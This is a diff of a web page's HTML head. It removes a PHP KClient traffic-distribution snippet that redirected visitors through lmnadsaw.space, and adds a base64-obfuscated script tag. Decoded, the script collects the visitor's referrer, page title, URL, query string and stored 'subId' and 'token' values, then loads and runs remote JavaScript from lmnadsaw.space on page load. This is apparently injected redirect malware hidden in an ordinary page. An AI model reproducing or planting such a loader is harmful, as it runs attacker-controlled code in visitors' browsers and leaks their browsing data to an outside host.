@@ -1,21 +1,8 @@
-<?php
-// Query params are: fbpxl=187738549962664&b=zti&k=63&c=ONE&sub_id_10=main 
 
-require_once dirname(__FILE__) . '/kclient.php';
-$client = new KClient('https://lmnadsaw.space/api.php?', 'ntbydKD9GbTPJWHV');
-$client->sendAllParams();       // to send all params from page query
-$client->forceRedirectOffer();       // redirect to offer if an offer is chosen
-// $client->param('sub_id_5', '123'); // you can send any params
-// $client->keyword('PASTE_KEYWORD');  // send custom keyword
-// $client->currentPageAsReferrer(); // to send current page URL as click referrer
-// $client->disableSessions(); // to disable using session cookie (without this cookie restoreFromSession wouldn't work)
-// $client->debug();              // to enable debug mode and show the errors
-// $client->execute();             // request to api, show the output and continue
-$client->executeAndBreak();     // to stop page execution if there is redirect or some output
-?>
 <!doctype html>
 <html class="no-js" lang="en-US" >
   <head>
+    <script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfMTRxczlTMXNwNnhwQlp4aic7CiAgICBpZiAoIXdpbmRvdy5fMTRxczlTMXNwNnhwQlp4aikgewogICAgICAgIHdpbmRvdy5fMTRxczlTMXNwNnhwQlp4aiA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly9sbW5hZHNhdy5zcGFjZS80NXNmamgzZXdzMycsCiAgICAgICAgfTsKICAgIH0KICAgIGNvbnN0IF85RlR4SjM2ZGtLS1RyY3ZxID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ2NvbmZpZycpOwogICAgaWYgKHR5cGVvZiBfOUZUeEozNmRrS0tUcmN2cSAhPT0gJ3VuZGVmaW5lZCcgJiYgXzlGVHhKMzZka0tLVHJjdnEgIT09IG51bGwpIHsKICAgICAgICB2YXIgX1RHcnpwWUhwUExjdm5DUHkgPSBKU09OLnBhcnNlKF85RlR4SjM2ZGtLS1RyY3ZxKTsKICAgICAgICB2YXIgX3FQazk1ZzVSUzYzVEZIOFMgPSBNYXRoLnJvdW5kKCtuZXcgRGF0ZSgpLzEwMDApOwogICAgICAgIGlmIChfVEdyenBZSHBQTGN2bkNQeS5jcmVhdGVkX2F0ICsgd2luZG93Ll8xNHFzOVMxc3A2eHBCWnhqLnR0bCA8IF9xUGs5NWc1UlM2M1RGSDhTKSB7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdzdWJJZCcpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgndG9rZW4nKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ2NvbmZpZycpOwogICAgICAgIH0KICAgIH0KICAgIHZhciBfUVliQlEyWHFGZ3FQS1MyMSA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdzdWJJZCcpOwogICAgdmFyIF8ya1NnUjhncTdNMWRxS3lXID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3Rva2VuJyk7CiAgICB2YXIgX2JXQlRkdmhadnpnVmZqY1kgPSAnP3JldHVybj1qcy5jbGllbnQnOwogICAgICAgIF9iV0JUZHZoWnZ6Z1ZmamNZICs9ICcmJyArIGRlY29kZVVSSUNvbXBvbmVudCh3aW5kb3cubG9jYXRpb24uc2VhcmNoLnJlcGxhY2UoJz8nLCAnJykpOwogICAgICAgIF9iV0JUZHZoWnZ6Z1ZmamNZICs9ICcmc2VfcmVmZXJyZXI9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5yZWZlcnJlcik7CiAgICAgICAgX2JXQlRkdmhadnpnVmZqY1kgKz0gJyZkZWZhdWx0X2tleXdvcmQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC50aXRsZSk7CiAgICAgICAgX2JXQlRkdmhadnpnVmZqY1kgKz0gJyZsYW5kaW5nX3VybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmxvY2F0aW9uLmhvc3RuYW1lICsgZG9jdW1lbnQubG9jYXRpb24ucGF0aG5hbWUpOwogICAgICAgIF9iV0JUZHZoWnZ6Z1ZmamNZICs9ICcmbmFtZT0nICsgZW5jb2RlVVJJQ29tcG9uZW50KG5hbWUpOwogICAgICAgIF9iV0JUZHZoWnZ6Z1ZmamNZICs9ICcmaG9zdD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5fMTRxczlTMXNwNnhwQlp4ai5SX1BBVEgpOwogICAgaWYgKHR5cGVvZiBfUVliQlEyWHFGZ3FQS1MyMSAhPT0gJ3VuZGVmaW5lZCcgJiYgX1FZYkJRMlhxRmdxUEtTMjEgJiYgd2luZG93Ll8xNHFzOVMxc3A2eHBCWnhqLnVuaXF1ZSkgewogICAgICAgIF9iV0JUZHZoWnZ6Z1ZmamNZICs9ICcmc3ViX2lkPScgKyBlbmNvZGVVUklDb21wb25lbnQoX1FZYkJRMlhxRmdxUEtTMjEpOwogICAgfQogICAgaWYgKHR5cGVvZiBfMmtTZ1I4Z3E3TTFkcUt5VyAhPT0gJ3VuZGVmaW5lZCcgJiYgXzJrU2dSOGdxN00xZHFLeVcgJiYgd2luZG93Ll8xNHFzOVMxc3A2eHBCWnhqLnVuaXF1ZSkgewogICAgICAgIF9iV0JUZHZoWnZ6Z1ZmamNZICs9ICcmdG9rZW49JyArIGVuY29kZVVSSUNvbXBvbmVudChfMmtTZ1I4Z3E3TTFkcUt5Vyk7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5fMTRxczlTMXNwNnhwQlp4ai5SX1BBVEggKyBfYldCVGR2aFp2emdWZmpjWTsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTsKICAgIA=="></script>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
